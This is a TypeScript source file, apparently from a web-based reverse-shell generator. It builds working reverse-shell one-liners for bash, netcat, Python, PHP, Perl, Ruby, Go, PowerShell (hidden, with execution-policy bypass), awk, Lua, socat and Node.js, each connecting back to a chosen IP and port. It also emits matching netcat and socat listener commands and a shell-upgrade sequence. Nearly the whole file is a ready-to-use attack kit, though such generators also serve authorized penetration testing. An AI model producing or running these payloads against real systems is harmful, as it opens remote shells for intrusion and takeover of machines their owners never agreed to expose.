import { type PayloadConfig } from "@shared/schema";

export const SHELL_OPTIONS = [
  { value: "/bin/bash", label: "/bin/bash" },
  { value: "/bin/sh", label: "/bin/sh" },
  { value: "cmd.exe", label: "cmd.exe" },
  { value: "/bin/zsh", label: "/bin/zsh" },
];

export const PAYLOAD_TYPES = [
  { value: "bash", label: "Bash -i", icon: "Terminal" },
  { value: "bash_tcp", label: "Bash TCP", icon: "Terminal" },
  { value: "nc", label: "Netcat", icon: "Radio" },
  { value: "nc_mkfifo", label: "Netcat Mkfifo", icon: "Radio" },
  { value: "python", label: "Python", icon: "Code" },
  { value: "python3", label: "Python3", icon: "Code" },
  { value: "php", label: "PHP", icon: "FileJson" },
  { value: "perl", label: "Perl", icon: "FileCode" },
  { value: "ruby", label: "Ruby", icon: "Gem" },
  { value: "golang", label: "Golang", icon: "Box" },
  { value: "powershell", label: "PowerShell", icon: "TerminalSquare" },
  { value: "awk", label: "Awk", icon: "FileCode" },
  { value: "lua", label: "Lua", icon: "Moon" },
  { value: "socat", label: "Socat", icon: "Network" },
  { value: "nodejs", label: "NodeJS", icon: "Hexagon" },
] as const;

export function generatePayload(config: PayloadConfig): string {
  const { ip, port, type, shell } = config;

  switch (type) {
    case "bash":
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      
    case "bash_tcp":
      return `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`;

    case "nc":
      return `nc -e ${shell} ${ip} ${port}`;

    case "nc_mkfifo":
      return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`;

    case "python":
      return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["${shell}","-i"]);'`;
      
    case "python3":
      return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["${shell}","-i"]);'`;

    case "php":
      return `php -r '$sock=fsockopen("${ip}",${port});exec("${shell} <&3 >&3 2>&3");'`;

    case "perl":
      return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`;

    case "ruby":
      return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`;

    case "golang":
      return `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("${shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`;

    case "powershell":
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

    case "awk":
      return `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;

    case "lua":
      return `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('${shell} -i <&3 >&3 2>&3');"`;

    case "socat":
      return `socat tcp-connect:${ip}:${port} exec:${shell},pty,stderr,setsid,sigint,sane`;

    case "nodejs":
      return `(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("${shell}", []); var client = new net.Socket(); client.connect(${port}, "${ip}", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();`;

    default:
      return "Select a payload type";
  }
}

export function generateListener(port: number, type: string): string {
  if (type === "socat") {
    return `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`;
  }
  if (type === "powershell") {
    return `nc -lvnp ${port}`;
  }
  return `nc -lvnp ${port}`;
}

export function generateTtyUpgrade(shell: string = "/bin/bash"): string {
  return `python3 -c 'import pty; pty.spawn("${shell}")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm`;
}
